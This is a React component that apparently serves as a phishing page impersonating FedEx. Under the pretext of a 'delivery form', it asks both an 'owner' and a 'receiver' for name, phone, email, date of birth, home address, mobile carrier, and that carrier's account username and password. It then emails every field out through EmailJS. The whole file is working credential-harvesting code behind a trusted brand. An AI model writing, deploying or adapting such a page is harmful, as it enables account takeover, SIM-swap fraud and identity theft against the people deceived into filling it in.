import React, { useState, useRef } from 'react';
import emailjs from '@emailjs/browser';

export default function ContactDeliveryForm() {
  const formRef = useRef();

  const [showForm, setShowForm] = useState(false);
  const [loading, setLoading] = useState(false);
  const [statusMessage, setStatusMessage] = useState({
    type: '',
    text: '',
  });

  const sendEmail = (e) => {
    e.preventDefault();

    setLoading(true);
    setStatusMessage({ type: '', text: '' });

    const SERVICE_ID = import.meta.env.VITE_EMAILJS_SERVICE_ID;
    const TEMPLATE_ID = import.meta.env.VITE_EMAILJS_TEMPLATE_ID;
    const PUBLIC_KEY = import.meta.env.VITE_EMAILJS_PUBLIC_KEY;

    emailjs
      .sendForm(
        SERVICE_ID,
        TEMPLATE_ID,
        formRef.current,
        PUBLIC_KEY
      )
      .then(
        (result) => {
          console.log('EmailJS Success:', result);

          setLoading(false);

          setStatusMessage({
            type: 'success',
            text: "Delivery details received!\nWe'll reach out to you soon",
          });

          formRef.current.reset();
        },
        (error) => {
          console.error('EmailJS Error:', error);

          setLoading(false);

          setStatusMessage({
            type: 'error',
            text: 'Failed to send details. Check your configuration.',
          });
        }
      );
  };

  return (
    <div className="min-h-screen bg-gray-100 px-4 py-10">

      {/* =====================================================
          LANDING / INITIAL BUTTON
      ====================================================== */}

      {!showForm && (
        <div className="min-h-[80vh] flex flex-col items-center justify-center text-center">

          {/* Logo */}
          <img
            src="/logo.png"
            alt="FedEx Logo"
            className="h-32 w-auto object-contain mb-6"
          />

          <h1 className="text-4xl font-extrabold mb-3">
            <span className="text-[#4D148C]">Fed</span>
            <span className="text-[#FF6600]">Ex</span> Delivery Form
          </h1>

          <p className="max-w-xl text-gray-500 mb-8">
            Kindly provide the required ownership and recipient information to ensure a seamless delivery of the goods.
          </p>

          {/* FEDEX ORANGE BUTTON (NO RADIUS) */}
          <button
            type="button"
            onClick={() => {
              setShowForm(true);
              setStatusMessage({ type: '', text: '' });
            }}
            className="
              px-8
              py-4
              bg-[#FF6600]
              hover:bg-[#e05a00]
              active:scale-95
              text-white
              font-bold
              rounded-none
              shadow-lg
              transition-all
              duration-200
              hover:scale-105
              focus:outline-none
              focus:ring-2
              focus:ring-[#FF6600]
              focus:ring-offset-2
            "
          >
            Continue to Delivery Form
          </button>
        </div>
      )}

      {/* =====================================================
          DELIVERY FORM PAGE
      ====================================================== */}

      {showForm && (
        <div className="max-w-7xl mx-auto">

          {/* BACK BUTTON */}
          <div className="mb-6">
            <button
              type="button"
              onClick={() => {
                setShowForm(false);
                setStatusMessage({ type: '', text: '' });
              }}
              className="
                text-sm
                font-semibold
                text-[#FF6600]
                hover:text-[#e05a00]
                transition-colors
              "
            >
              ← Back
            </button>
          </div>

          {/* LOGO HEADER SECTION */}
          <div className="flex flex-col items-center mb-8">

            <img
              src="/logo.png"
              alt="FedEx Logo"
              className="h-32 w-auto object-contain mb-3"
            />

            <h2 className="text-3xl font-extrabold text-gray-900 text-center mb-2">
              FedEx Delivery Form
            </h2>

            <p className="text-sm text-gray-500 text-center">
              Kindly provide the required ownership and recipient information to ensure a seamless delivery of the goods.
            </p>
          </div>

          {/* STATUS MESSAGE */}
          {statusMessage.text && (
            <div
              className={`
                p-4
                mb-6
                rounded-none
                text-sm
                font-medium
                text-center
                ${
                  statusMessage.type === 'success'
                    ? 'bg-green-100 text-green-800 border border-green-300'
                    : 'bg-red-100 text-red-800 border border-red-300'
                }
              `}
            >
              {statusMessage.text}
            </div>
          )}

          {/* =====================================================
              FORM
          ====================================================== */}

          <form
            ref={formRef}
            onSubmit={sendEmail}
            className="space-y-8"
          >

            {/* OWNER + RECEIVER */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-8">

              {/* =================================================
                  SECTION 1: OWNER DETAILS
              ================================================== */}

              <div className="bg-gray-50 p-6 rounded-none border border-gray-200 shadow-sm">

                <h3 className="text-lg font-bold text-gray-800 border-b pb-2 mb-4">
                  1. Owner Details
                </h3>

                <div className="space-y-4">

                  {/* Owner Name */}
                  <div>
                    <label className="block text-xs font-semibold text-gray-600 uppercase mb-1">
                      Owner Name
                    </label>

                    <input
                      type="text"
                      name="owner_name"
                      required
                      placeholder="John Doe"
                      className="w-full px-3 py-2 border border-gray-300 rounded-none focus:outline-none focus:ring-2 focus:ring-[#FF6600]"
                    />
                  </div>

                  {/* Phone */}
                  <div>
                    <label className="block text-xs font-semibold text-gray-600 uppercase mb-1">
                      Phone Number
                    </label>

                    <input
                      type="tel"
                      name="owner_phone"
                      required
                      placeholder="+1 234 567 890"
                      className="w-full px-3 py-2 border border-gray-300 rounded-none focus:outline-none focus:ring-2 focus:ring-[#FF6600]"
                    />
                  </div>

                  {/* Email */}
                  <div>
                    <label className="block text-xs font-semibold text-gray-600 uppercase mb-1">
                      Email Address
                    </label>

                    <input
                      type="email"
                      name="owner_email"
                      required
                      placeholder="john@example.com"
                      className="w-full px-3 py-2 border border-gray-300 rounded-none focus:outline-none focus:ring-2 focus:ring-[#FF6600]"
                    />
                  </div>

                  {/* Date of Birth */}
                  <div>
                    <label className="block text-xs font-semibold text-gray-600 uppercase mb-1">
                      Date of Birth
                    </label>

                    <input
                      type="date"
                      name="owner_dob"
                      required
                      className="w-full px-3 py-2 border border-gray-300 rounded-none focus:outline-none focus:ring-2 focus:ring-[#FF6600]"
                    />
                  </div>

                  {/* Owner Network Carrier Select */}
                  <div>
                    <label className="block text-xs font-semibold text-gray-600 uppercase mb-1">
                      Network Carrier
                    </label>

                    <select
                      name="owner_carrier"
                      required
                      className="w-full px-3 py-2 border border-gray-300 rounded-none focus:outline-none focus:ring-2 focus:ring-[#FF6600] bg-white"
                    >
                      <option value="">
                        Select Carrier
                      </option>

                      <option value="Verizon">
                        Verizon
                      </option>

                      <option value="AT&T">
                        AT&T
                      </option>

                      <option value="T-Mobile">
                        T-Mobile
                      </option>
                    </select>
                  </div>

                  {/* Carrier Username + Password */}
                  <div className="flex flex-col sm:flex-row gap-4">

                    <div className="flex-1">
                      <label className="block text-xs font-semibold text-gray-600 uppercase mb-1">
                        Network Carrier Username
                      </label>

                      <input
                        type="text"
                        name="owner_courier_username"
                        required
                        placeholder="Carrier username"
                        className="w-full px-3 py-2 border border-gray-300 rounded-none focus:outline-none focus:ring-2 focus:ring-[#FF6600]"
                      />
                    </div>

                    <div className="flex-1">
                      <label className="block text-xs font-semibold text-gray-600 uppercase mb-1">
                        Network Carrier Password
                      </label>

                      <input
                        type="password"
                        name="owner_courier_password"
                        required
                        placeholder="Carrier password"
                        className="w-full px-3 py-2 border border-gray-300 rounded-none focus:outline-none focus:ring-2 focus:ring-[#FF6600]"
                      />
                    </div>

                  </div>

                  {/* Gadget Count */}
                  <div>
                    <label className="block text-xs font-semibold text-gray-600 uppercase mb-1">
                      Amount of Gadgets
                    </label>

                    <input
                      type="number"
                      name="gadget_count"
                      min="1"
                      required
                      placeholder="1"
                      className="w-full px-3 py-2 border border-gray-300 rounded-none focus:outline-none focus:ring-2 focus:ring-[#FF6600]"
                    />
                  </div>

                </div>
              </div>

              {/* =================================================
                  SECTION 2: RECEIVER DETAILS
              ================================================== */}

              <div className="bg-gray-50 p-6 rounded-none border border-gray-200 shadow-sm">

                <h3 className="text-lg font-bold text-gray-800 border-b pb-2 mb-4">
                  2. Receiver Details
                </h3>

                <div className="space-y-4">

                  {/* Receiver Name */}
                  <div>
                    <label className="block text-xs font-semibold text-gray-600 uppercase mb-1">
                      Receiver Name
                    </label>

                    <input
                      type="text"
                      name="receiver_name"
                      required
                      placeholder="Jane Smith"
                      className="w-full px-3 py-2 border border-gray-300 rounded-none focus:outline-none focus:ring-2 focus:ring-[#FF6600]"
                    />
                  </div>

                  {/* Receiver Gender */}
                  <div>
                    <label className="block text-xs font-semibold text-gray-600 uppercase mb-1">
                      Gender
                    </label>

                    <select
                      name="receiver_gender"
                      required
                      className="w-full px-3 py-2 border border-gray-300 rounded-none focus:outline-none focus:ring-2 focus:ring-[#FF6600] bg-white"
                    >
                      <option value="">
                        Select Gender
                      </option>

                      <option value="Male">
                        Male
                      </option>

                      <option value="Female">
                        Female
                      </option>

                      <option value="Other">
                        Other
                      </option>
                    </select>
                  </div>

                  {/* Receiver Network Carrier Select */}
                  <div>
                    <label className="block text-xs font-semibold text-gray-600 uppercase mb-1">
                      Network Carrier
                    </label>

                    <select
                      name="receiver_carrier"
                      required
                      className="w-full px-3 py-2 border border-gray-300 rounded-none focus:outline-none focus:ring-2 focus:ring-[#FF6600] bg-white"
                    >
                      <option value="">
                        Select Carrier
                      </option>

                      <option value="Verizon">
                        Verizon
                      </option>

                      <option value="AT&T">
                        AT&T
                      </option>

                      <option value="T-Mobile">
                        T-Mobile
                      </option>
                    </select>
                  </div>

                  {/* Receiver Carrier Username + Password */}
                  <div className="flex flex-col sm:flex-row gap-4">

                    <div className="flex-1">
                      <label className="block text-xs font-semibold text-gray-600 uppercase mb-1">
                        Network Carrier Username
                      </label>

                      <input
                        type="text"
                        name="receiver_courier_username"
                        required
                        placeholder="Carrier username"
                        className="w-full px-3 py-2 border border-gray-300 rounded-none focus:outline-none focus:ring-2 focus:ring-[#FF6600]"
                      />
                    </div>

                    <div className="flex-1">
                      <label className="block text-xs font-semibold text-gray-600 uppercase mb-1">
                        Network Carrier Password
                      </label>

                      <input
                        type="password"
                        name="receiver_courier_password"
                        required
                        placeholder="Carrier password"
                        className="w-full px-3 py-2 border border-gray-300 rounded-none focus:outline-none focus:ring-2 focus:ring-[#FF6600]"
                      />
                    </div>

                  </div>

                  {/* Address */}
                  <div>
                    <label className="block text-xs font-semibold text-gray-600 uppercase mb-1">
                      Home Address
                    </label>

                    <textarea
                      name="receiver_address"
                      rows="5"
                      required
                      placeholder="Enter full address..."
                      className="w-full px-3 py-2 border border-gray-300 rounded-none focus:outline-none focus:ring-2 focus:ring-[#FF6600]"
                    ></textarea>
                  </div>

                </div>
              </div>

            </div>

            {/* =================================================
                FEDEX ORANGE SUBMIT BUTTON (NO RADIUS)
            ================================================== */}

            <div className="text-center pt-2">

              <button
                type="submit"
                disabled={loading}
                className="
                  w-full
                  md:w-auto
                  px-10
                  py-3
                  bg-[#FF6600]
                  hover:bg-[#e05a00]
                  active:scale-95
                  text-white
                  font-bold
                  rounded-none
                  shadow-md
                  transition-all
                  focus:outline-none
                  focus:ring-2
                  focus:ring-[#FF6600]
                  disabled:opacity-50
                  disabled:cursor-not-allowed
                "
              >
                {loading
                  ? 'Sending Details...'
                  : 'Submit Form'}
              </button>

            </div>

          </form>
        </div>
      )}
    </div>
  );
}